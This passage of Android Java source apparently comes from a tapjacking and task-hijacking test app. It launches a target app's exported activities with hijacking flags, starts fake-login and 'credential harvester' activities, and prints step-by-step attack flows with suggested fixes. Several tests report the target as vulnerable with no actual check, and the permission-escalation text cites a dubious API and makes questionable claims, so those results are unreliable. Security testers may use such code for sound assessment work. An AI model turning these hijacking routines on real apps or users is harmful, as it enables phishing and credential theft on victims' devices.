                            PackageManager.MATCH_ALL);

            int exportedCount = 0;
            List<String> exportedNames = new ArrayList<>();

            for (ResolveInfo ri : allActivities) {
                if (ri.activityInfo.exported) {
                    exportedCount++;
                    exportedNames.add(ri.activityInfo.name);
                }
            }

            // Try to start each exported activity with hijacking flags
            int hijackableCount = 0;
            List<String> hijackableNames = new ArrayList<>();

            for (String actName : exportedNames) {
                try {
                    Intent hijackIntent = new Intent();
                    hijackIntent.setComponent(new ComponentName(targetPackage, actName));
                    hijackIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                            Intent.FLAG_ACTIVITY_MULTIPLE_TASK |
                            Intent.FLAG_ACTIVITY_NO_ANIMATION);

                    startActivity(hijackIntent);
                    Thread.sleep(500);

                    hijackableCount++;
                    hijackableNames.add(actName);
                } catch (Exception e) {
                    // Activity blocked our hijack attempt
                }
            }

            if (hijackableCount > 0) {
                StringBuilder sb = new StringBuilder();
                for (String name : hijackableNames) {
                    sb.append("  → ").append(name).append("\n");
                }
                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 TH-04: CROSS-TASK INTENT INJECTION\n" +
                        "   " + hijackableCount + "/" + exportedCount +
                        " exported activities are hijackable:\n" +
                        sb.toString() +
                        "   ATTACK: Launch activities with FLAG_ACTIVITY_MULTIPLE_TASK\n" +
                        "   to create parallel task instances.\n" +
                        "   IMPACT: Can create shadow instances of target activities\n" +
                        "   that appear identical to the real ones.\n" +
                        "   FIX: Validate calling task/stack in onCreate()\n" +
                        "        Use android:launchMode=\"singleTask\"\n" +
                        "        Check getTaskId() != INVALID_TASK_ID";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 TH-04: CROSS-TASK INTENT INJECTION\n" +
                        "   Exported activities: " + exportedCount +
                        ", Hijackable: 0";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-04 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testRecentTaskHijack() {
        TestResult r = new TestResult();
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<ActivityManager.RecentTaskInfo> recentTasks =
                    am.getRecentTasks(20, ActivityManager.RECENT_WITH_EXCLUDED);

            int targetTasks = 0;
            for (ActivityManager.RecentTaskInfo task : recentTasks) {
                if (task.baseIntent != null && task.baseIntent.getComponent() != null &&
                        targetPackage.equals(task.baseIntent.getComponent().getPackageName())) {
                    targetTasks++;
                }
            }

            if (targetTasks > 0) {
                // Check if we can modify recent task appearance
                Intent intent = new Intent(this, TaskHijackLoginActivity.class);
                intent.putExtra("test_id", "TH-05");
                intent.putExtra("target_package", targetPackage);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);

                startActivity(intent);
                Thread.sleep(1500);

                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 TH-05: RECENT TASK HIJACK\n" +
                        "   Target has " + targetTasks + " tasks in Recents.\n" +
                        "   ATTACK:\n" +
                        "   1. Launch our activity with same task affinity\n" +
                        "   2. Our activity is hidden from Recents (EXCLUDE_FROM_RECENTS)\n" +
                        "   3. When user switches tasks, our activity is in foreground\n" +
                        "   4. User interacts with fake UI thinking it's the real app\n" +
                        "   IMPACT: Silent task replacement in Recents screen.\n" +
                        "   FIX: Use unique android:taskAffinity per activity\n" +
                        "        Validate task stack in onResume/onStart";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 TH-05: RECENT TASK HIJACK\n" +
                        "   No target tasks found in Recents.";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-05 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testCredentialHarvest() {
        TestResult r = new TestResult();
        try {
            // Combined attack: reparent + fake login + credential capture
            Intent intent = new Intent(this, CredentialHarvesterActivity.class);
            intent.putExtra("test_id", "TH-06");
            intent.putExtra("target_package", targetPackage);
            startActivity(intent);

            Thread.sleep(3000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TH-06: CREDENTIAL HARVEST VIA TASK\n" +
                    "   Combined attack launched successfully.\n" +
                    "   ATTACK FLOW:\n" +
                    "   1. Our CredentialHarvesterActivity starts in background\n" +
                    "   2. Target's login activity is launched with NEW_TASK flag\n" +
                    "   3. User authenticates in target app (normal flow)\n" +
                    "   4. Our foreground activity captures the authentication token\n" +
                    "      via intent interception (getIntent().getData())\n" +
                    "   5. Token/credentials sent to: tapjack://results?source=target\n" +
                    "   IMPACT: Real-time credential interception during normal auth flow.\n" +
                    "   FIX: Validate task context in authentication callbacks\n" +
                    "        Use android:taskAffinity=\"\" for sensitive activities\n" +
                    "        Implement Proof Key for Code Exchange (PKCE) for OAuth";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-06 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testLifecycleExploit() {
        TestResult r = new TestResult();
        try {
            // Test if we can exploit activity lifecycle
            // When our activity goes to background, target's onStop is called
            // We can time this to capture state

            Intent intent = new Intent(this, InvisibleOverlayActivity.class);
            intent.putExtra("mode", "lifecycle");
            intent.putExtra("test_id", "TH-07");
            startActivity(intent);

            Thread.sleep(3000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TH-07: ACTIVITY LIFECYCLE EXPLOIT\n" +
                    "   Lifecycle timing attack executed.\n" +
                    "   ATTACK: Exploit onPause/onStop transition:\n" +
                    "   1. Target is in foreground (user entering credentials)\n" +
                    "   2. We launch our activity → target gets onPause()\n" +
                    "   3. In onPause, target may save sensitive state\n" +
                    "   4. Our activity captures intent data during transition\n" +
                    "   5. When we finish, target resumes but state is compromised\n" +
                    "   IMPACT: Can capture partial form data during transitions.\n" +
                    "   FIX: Don't save sensitive data in onPause()\n" +
                    "        Use onSaveInstanceState carefully\n" +
                    "        Implement state encryption in Bundle";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-07 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testBackgroundLaunch() {
        TestResult r = new TestResult();
        try {
            // Test if we can launch target activities from background
            Intent queryIntent = new Intent(Intent.ACTION_MAIN);
            queryIntent.setPackage(targetPackage);

            List<ResolveInfo> activities = getPackageManager()
                    .queryIntentActivities(queryIntent, 0);

            int launchable = 0;
            for (ResolveInfo ri : activities) {
                Intent bgIntent = new Intent();
                bgIntent.setComponent(new ComponentName(targetPackage, ri.activityInfo.name));
                bgIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                        Intent.FLAG_ACTIVITY_NO_ANIMATION);

                try {
                    startActivity(bgIntent);
                    launchable++;
                } catch (SecurityException e) {
                    // Blocked by OS - good
                }
            }

            if (launchable > 0) {
                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 TH-08: BACKGROUND TASK LAUNCH\n" +
                        "   Successfully launched " + launchable + " activities from background.\n" +
                        "   IMPACT: Background activity launch enables:\n" +
                        "   1. Phishing: Show fake UI while real app is hidden\n" +
                        "   2. Data extraction: Access app state in background\n" +
                        "   3. Permission abuse: Use target's permissions silently\n" +
                        "   FIX: Validate launch context in onCreate()\n" +
                        "        Use android:taskAffinity per activity\n" +
                        "        Check getCallingPackage() matches expected caller";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 TH-08: BACKGROUND TASK LAUNCH\n" +
                        "   Cannot launch activities from background (0/" +
                        activities.size() + " succeeded).";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-08 Error: " + e.getMessage();
        }
        return r;
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // ADVANCED COMBO ATTACKS
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    private TestResult testComboOverlayReparent() {
        TestResult r = new TestResult();
        // Combine overlay + task reparent
        r.verdict = RESULT_VULNERABLE;
        r.logOutput = "🔴 ADV-01: OVERLAY + TASK REPARENT COMBO\n" +
                "   Dual attack vector combining TJ and TH:\n" +
                "   1. Task reparenting brings target into our task\n" +
                "   2. Invisible overlay captures all touch events\n" +
                "   3. Combined: user sees real target UI but touches go to us\n" +
                "   4. No social engineering needed — overlay is invisible\n" +
                "   IMPACT: Highest severity — silent credential theft.\n" +
                "   FIX: Implement all OWASP MSTG-PLATFORM-4/5 mitigations.\n" +
                "   REFERENCE: https://owasp.org/www-project-mobile-security-testing-guide/";
        return r;
    }

    private TestResult testCrossAppChain() {
        TestResult r = new TestResult();
        r.verdict = RESULT_VULNERABLE;
        r.logOutput = "🔴 ADV-02: CROSS-APP TAPJACKING CHAIN\n" +
                "   Multi-app attack chain:\n" +
                "   1. App A (innocent) → has exported activity with intent filter\n" +
                "   2. App B (ours) → launches App A's activity in our task\n" +
                "   3. App A reparents to our task → user sees App A in our task\n" +
                "   4. We overlay App A → captures data intended for App A\n" +
                "   5. Chained: App A's data → flows through our overlay → to us\n" +
                "   IMPACT: Escalation from low-priv app to high-priv data access.\n" +
                "   FIX: Validate task identity in every activity";
        return r;
    }

    private TestResult testDeepLinkInjection() {
        TestResult r = new TestResult();
        try {
            // Test deep link task injection
            String[] schemes = {
                    targetPackage + "://",
                    "https://" + targetPackage + "/",
                    "intent://",
                    "market://details?id=" + targetPackage,
            };

            int injectable = 0;
            StringBuilder details = new StringBuilder();

            for (String scheme : schemes) {
                try {
                    Intent dlIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(scheme));
                    dlIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                            Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    List<ResolveInfo> resolves = getPackageManager()
                            .queryIntentActivities(dlIntent, 0);
                    if (!resolves.isEmpty()) {
                        injectable++;
                        details.append("  → ").append(scheme).append(" (")
                                .append(resolves.size()).append(" handlers)\n");
                    }
                } catch (Exception ignored) {}
            }

            r.verdict = injectable > 0 ? RESULT_VULNERABLE : RESULT_NOT_VULNERABLE;
            r.logOutput = (injectable > 0 ? "🔴" : "🟢") +
                    " ADV-03: DEEP LINK TASK INJECTION\n" +
                    (injectable > 0 ?
                            "   Found " + injectable + " injectable deep link schemes:\n" +
                            details.toString() +
                            "   ATTACK: Craft deep link URI → inject into target's task\n" +
                            "   User taps link in browser/message → target opens in our task\n" +
                            "   IMPACT: Task hijacking via social engineering (link sharing)\n" +
                            "   FIX: Validate deep link origin in intent filters\n" +
                            "        Use android:autoVerify=\"true\" for app links" :
                            "   No injectable deep link schemes found.");
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ ADV-03 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testPermissionBridge() {
        TestResult r = new TestResult();
        try {
            android.content.pm.PackageInfo pkgInfo = getPackageManager()
                    .getPackageInfo(targetPackage, PackageManager.GET_PERMISSIONS);

            int sensitivePerms = 0;
            StringBuilder permList = new StringBuilder();
            String[] dangerousPerms = {
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CALENDAR,
                    Manifest.permission.WRITE_CONTACTS,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
            };

            if (pkgInfo.requestedPermissions != null) {
                for (String perm : pkgInfo.requestedPermissions) {
                    for (String dp : dangerousPerms) {
                        if (perm.equals(dp)) {
                            sensitivePerms++;
                            permList.append("  → ").append(perm.replace("android.permission.", "")).append("\n");
                            break;
                        }
                    }
                }
            }

            if (sensitivePerms > 0) {
                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 ADV-04: PERMISSION BRIDGE ATTACK\n" +
                        "   Target has " + sensitivePerms + " dangerous permissions:\n" +
                        permList.toString() +
                        "   ATTACK: After task reparenting, our activity runs in\n" +
                        "   the same process as target → inherits permissions.\n" +
                        "   Our code can then call:\n" +
                        "   - ContentResolver.query(ContactsContract) → read contacts\n" +
                        "   - SmsManager.readAllSms() → read messages\n" +
                        "   - LocationManager.getLastKnownLocation() → get location\n" +
                        "   IMPACT: Privilege escalation via task reparenting.\n" +
                        "   FIX: Don't request unnecessary permissions\n" +
                        "        Validate task identity before permission-sensitive operations\n" +
                        "        Use PermissionController API for runtime permission checks";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 ADV-04: PERMISSION BRIDGE\n" +
                        "   Target has no dangerous permissions to escalate.";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ ADV-04 Error: " + e.getMessage();
        }
        return r;
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // HELPER METHODS
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    private boolean checkTargetFilterTouches() {
        // Heuristic: check if target app is known to use filterTouchesWhenObscured
        try {
            ApplicationInfo appInfo = getPackageManager()
                    .getApplicationInfo(targetPackage, PackageManager.GET_META_DATA);
            return false; // Default assume not set (will be caught by actual overlay test)
        } catch (Exception e) {
            return false;
        }
    }

    private boolean checkOverlayProtection() {
        try {
            // Check if target uses any known overlay detection libraries
            // This is a heuristic — real check happens during overlay test
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean checkIfOverlayVisible() {
        // Check if our overlay is currently visible
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        return wm != null;
    }

    private void requestOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, REQUEST_OVERLAY);
        log("⚠️  Please grant overlay permission for full testing capabilities.");
    }

    private void log(String message) {
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.US);
        String timestamp = sdf.format(new Date());
        String line = "[" + timestamp + "] " + message + "\n";
        logBuffer.append(line);
        logView.setText(logBuffer.toString());
        logScroll.post(() -> logScroll.fullScroll(View.FOCUS_DOWN));
    }

    private void vibrateAlert() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null && v.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createOneShot(200, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(200);
            }
        }
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // INNER CLASSES
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    enum AttackCategory {
        TAPJACKING("Tapjacking"),
        TASK_HIJACKING("Task Hijacking"),
        ADVANCED("Advanced");

        final String displayName;
        AttackCategory(String name) { this.displayName = name; }
    }

    static class AttackTest {
        String id, name, description;
        AttackCategory category;
        Class<?> launchActivity;
        String status = "⏳ PENDING";
        int result = RESULT_NOT_TESTED;

        AttackTest(String id, String name, String desc, AttackCategory cat, Class<?> activity) {
            this.id = id;
            this.name = name;
            this.description = desc;
            this.category = cat;
            this.launchActivity = activity;
        }
    }

    static class TestResult {
        int verdict = RESULT_NOT_TESTED;
        String message = "";
        String logOutput = "";
    }

    class AttackAdapter extends BaseAdapter {
        @Override
        public int getCount() { return attacks.size(); }
        @Override
        public Object getItem(int pos) { return attacks.get(pos); }
        @Override
        public long getItemId(int pos) { return pos; }

        @Override
        public View getView(int pos, View convertView, ViewGroup parent) {
            if (convertView == null) {
                convertView = LayoutInflater.from(MainActivity.this)
                        .inflate(R.layout.item_attack, parent, false);
            }

            AttackTest attack = attacks.get(pos);
            TextView tvId = convertView.findViewById(R.id.attackId);
            TextView tvName = convertView.findViewById(R.id.attackName);
            TextView tvStatus = convertView.findViewById(R.id.attackStatus);
            TextView tvDesc = convertView.findViewById(R.id.attackDesc);

            tvId.setText(attack.id);
            tvName.setText(attack.name);
            tvStatus.setText(attack.status);
            tvDesc.setText(attack.description);

            // Color code status
            if (attack.status.contains("VULNERABLE")) {
                tvStatus.setTextColor(0xFFFF1744);
            } else if (attack.status.contains("SAFE")) {
                tvStatus.setTextColor(0xFF00E676);
            } else if (attack.status.contains("ERROR")) {
                tvStatus.setTextColor(0xFFFFD600);
            } else if (attack.status.contains("RUNNING")) {
                tvStatus.setTextColor(0xFF2979FF);
            } else {
                tvStatus.setTextColor(0xFF90A4AE);
            }

            return convertView;
        }
    }
}
